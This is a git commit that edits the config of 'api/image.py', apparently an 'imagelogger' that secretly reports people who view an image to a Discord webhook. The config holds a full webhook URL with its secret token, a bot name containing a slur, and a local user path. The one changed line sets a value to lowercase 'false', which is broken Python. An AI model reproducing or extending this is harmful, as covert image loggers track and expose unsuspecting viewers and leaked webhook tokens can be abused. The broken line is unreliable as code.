20bc013372ed1a3132787b1c150047bc9aa1ef68
MoonAnimates13 <142915020+MoonAnimates13@users.noreply.github.com>
2025-12-29 00:21:52 -0500

    Update image.py

--- api/image.py
+++ api/image.py
@@ -15,7 +15,7 @@ config = {
     "webhook": "https://discord.com/api/webhooks/1455052799493800151/u3ru2dK_58PLrguELCjX6h3H4Swf0xGbNxfJmgXoAaA9nqCPA0V0EJWrQobcA2SDa5nA",
     "image": "file:///C:/Users/stron/Pictures/qwerty.PNG", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "imageArgument": false, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
     "username": "RetardedSpeed67", # Set this to the name you want the webhook to have
